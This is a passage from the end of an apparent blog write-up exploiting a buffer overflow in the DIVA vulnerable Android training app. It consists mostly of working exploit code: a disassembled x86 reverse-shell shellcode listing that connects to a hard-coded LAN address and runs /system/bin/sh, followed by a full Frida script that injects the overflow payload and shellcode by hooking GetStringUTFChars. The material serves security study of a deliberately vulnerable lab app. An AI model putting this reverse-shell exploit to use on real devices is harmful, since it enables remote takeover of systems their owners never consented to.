<br>0000001E&nbsp;&nbsp;CD80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;int 0x80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/* socketcall syscall #102 */
<br>00000020&nbsp;&nbsp;93&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;xchg&nbsp;&nbsp;eax,ebx
<br>00000021&nbsp;&nbsp;89D1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;ecx,edx
<br>00000023&nbsp;&nbsp;B03F&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;al,0x3f
<br>00000025&nbsp;&nbsp;CD80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;int 0x80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/* dup2&nbsp;&nbsp;syscall&nbsp;&nbsp;#63 */
<br>00000027&nbsp;&nbsp;49&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dec&nbsp;&nbsp;ecx
<br>00000028&nbsp;&nbsp;79F9&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;jns&nbsp;&nbsp;0x23
<br>0000002A&nbsp;&nbsp;B066&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;al,0x66
<br>0000002C&nbsp;&nbsp;87DA&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;xchg&nbsp;&nbsp;ebx,edx
<br>0000002E&nbsp;&nbsp;68C0A801C1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;dword&nbsp;&nbsp;0xc101a8c0
<br>00000033&nbsp;&nbsp;6668115C&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;word&nbsp;&nbsp;0x5c11
<br>00000037&nbsp;&nbsp;6653&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;bx
<br>00000039&nbsp;&nbsp;43&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;inc&nbsp;&nbsp;ebx
<br>0000003A&nbsp;&nbsp;89E1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;ecx,esp
<br>0000003C&nbsp;&nbsp;6A10&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;byte&nbsp;&nbsp;+0x10
<br>0000003E&nbsp;&nbsp;51&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;ecx
<br>0000003F&nbsp;&nbsp;52&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;edx
<br>00000040&nbsp;&nbsp;89E1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;ecx,esp
<br>00000042&nbsp;&nbsp;CD80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;int 0x80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/* socketcall&nbsp;&nbsp;syscall&nbsp;&nbsp;#102 */
<br>00000044&nbsp;&nbsp;6A0B&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;byte&nbsp;&nbsp;+0xb
<br>00000046&nbsp;&nbsp;58&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pop&nbsp;&nbsp;eax
<br>00000047&nbsp;&nbsp;99&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cdq
<br>00000048&nbsp;&nbsp;89D1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;ecx,edx
<br>0000004A&nbsp;&nbsp;52&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;edx
<br>0000004B&nbsp;&nbsp;682F2F7368&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;dword&nbsp;&nbsp;0x68732f2f
<br>00000050&nbsp;&nbsp;682F62696E&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;dword&nbsp;&nbsp;0x6e69622f
<br>00000055&nbsp;&nbsp;6874656D2F&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;dword&nbsp;&nbsp;0x2f6d6574
<br>0000005A&nbsp;&nbsp;682F737973&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push &nbsp;&nbsp;dword&nbsp;&nbsp;0x7379732f
<br>0000005F&nbsp;&nbsp;89E3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;ebx,esp
<br>00000061&nbsp;&nbsp;CD80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;int 0x80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/* execve&nbsp;&nbsp;syscall&nbsp;&nbsp;#11 */
<br>00000063&nbsp;&nbsp;0A&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;db&nbsp;&nbsp;0x0a
</p>
<br>And the final Frida exploit script is
<br>![14-82](https://teckk2.github.io/assets/images/DIVA/14-82.png)
<br>++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<br>Java.perform(function () {                                                                                                                                                   <br>&nbsp;&nbsp;try {
<br>&nbsp;&nbsp;&nbsp;&nbsp;var env = Java.vm.getEnv();
<br>&nbsp;&nbsp;&nbsp;&nbsp;var handlePointer = Memory.readPointer(env.handle);
<br>&nbsp;&nbsp;&nbsp;&nbsp;console.log("\n\t[\*] Java.vm.env handle: " + handlePointer);
<br>&nbsp;&nbsp;&nbsp;&nbsp;var GetStringUTFChars = ptr(handlePointer - 0x60d9b4);
<br>&nbsp;&nbsp;&nbsp;&nbsp;console.log("\t[\*] GetStringUTFChars addr: " + GetStringUTFChars);
<br>
<br>&nbsp;&nbsp;&nbsp;&nbsp;var st = Memory.alloc(40);
<br>&nbsp;&nbsp;&nbsp;&nbsp;var blah = [0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41];
<br>&nbsp;&nbsp;&nbsp;&nbsp;console.log("\t[\*] Allocated Heap memory for BOF payload (32 A)");
<br>
<br>&nbsp;&nbsp;&nbsp;&nbsp;var shell = [0x29, 0xc0, 0xb0, 0x02, 0xcd, 0x80, 0x85, 0xc0, 0x75, 0x02, 0xeb, 0x05, 0x29, 0xc0, 0x40, 0xcd, 0x80, 0x6a, 0x66, 0x58, 0x99, 0x52, 0x42, 0x52, 0x89, 0xd3, 0x42, 0x52, 0x89, 0xe1, 0xcd, 0x80, 0x93, 0x89, 0xd1, 0xb0, 0x3f, 0xcd, 0x80, 0x49, 0x79, 0xf9, 0xb0, 0x66, 0x87, 0xda, 0x68, 0xc0, 0xa8, 0x01];
<br>&nbsp;&nbsp;&nbsp;&nbsp;var sh = Memory.alloc(128);
<br>&nbsp;&nbsp;&nbsp;&nbsp;Memory.protect(ptr(sh), 128, 'rwx');
<br>&nbsp;&nbsp;&nbsp;&nbsp;Memory.writeByteArray(sh, shell);
<br>&nbsp;&nbsp;&nbsp;&nbsp;console.log("\t[\*] Allocated Heap memory for Reverse Shell");
<br>
<br>&nbsp;&nbsp;&nbsp;&nbsp;var ps = sh.toString().match(/[\s\S]{1,2}/g) || [];
<br>&nbsp;&nbsp;&nbsp;&nbsp;blah.push(parseInt(ps[4], 16), parseInt(ps[3], 16), parseInt(ps[2], 16), parseInt(ps[1], 16));
<br>&nbsp;&nbsp;&nbsp;&nbsp;Memory.writeByteArray(st, blah);
<br>&nbsp;&nbsp;&nbsp;&nbsp;console.log("\t[\*] Added RET address of Reverse Shell to BOF payload");
<br>
<br>&nbsp;&nbsp;&nbsp;&nbsp;Interceptor.attach(GetStringUTFChars, {
<br>&nbsp;&nbsp;&nbsp;&nbsp;onLeave: function(retval){
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var fuck = retval.readCString();
<br>
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(fuck == "bof"){
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;retval.replace(st);
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.log("\n\t[\*] BOF Payload + RET HExdump");
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.log(hexdump(st));
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.log("\t[\*] Reverse Shell Hexdump");
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.log(hexdump(sh, {length: 128}));
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
<br>&nbsp;&nbsp;&nbsp;&nbsp;}
<br>&nbsp;&nbsp;&nbsp;&nbsp;});
<br>&nbsp;&nbsp;}
<br>&nbsp;&nbsp;catch(e) {
<br>&nbsp;&nbsp;&nbsp;&nbsp;console.log(e.message);
<br>&nbsp;&nbsp;}
<br>});
<br>++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>



<p class="message">
  ~ tavşanı sever
</p>

[Twitter](https://twitter.com/Teck__K2) / [Hack The Box](https://www.hackthebox.eu/profile/966) / [CTF Team](https://ctftime.org/team/20102) /
[Teck_N00bs Community Telegram](https://t.me/Teck_N00bs)

<script src="https://www.hackthebox.eu/badge/966"> </script>
